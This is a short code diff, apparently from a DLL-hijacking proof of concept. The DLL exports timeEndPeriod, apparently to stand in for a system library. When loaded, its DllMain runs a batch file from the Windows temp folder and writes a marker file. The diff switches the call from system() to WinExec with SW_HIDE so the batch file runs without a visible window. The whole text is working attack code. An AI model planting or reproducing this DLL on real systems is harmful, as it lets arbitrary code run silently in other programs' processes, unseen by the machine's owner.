@@ -17,7 +17,7 @@ EXTERN_DLL_EXPORT UINT timeEndPeriod(UINT uPeriod) {
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
 
 	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-		system("c:\\windows\\temp\\win.bat");
+		WinExec("c:\\windows\\temp\\win.bat",SW_HIDE);
 		std::ofstream file("C:\\Windows\\pippo.txt");
 		file << "DLL EXECUTED" << std::endl;
 	}
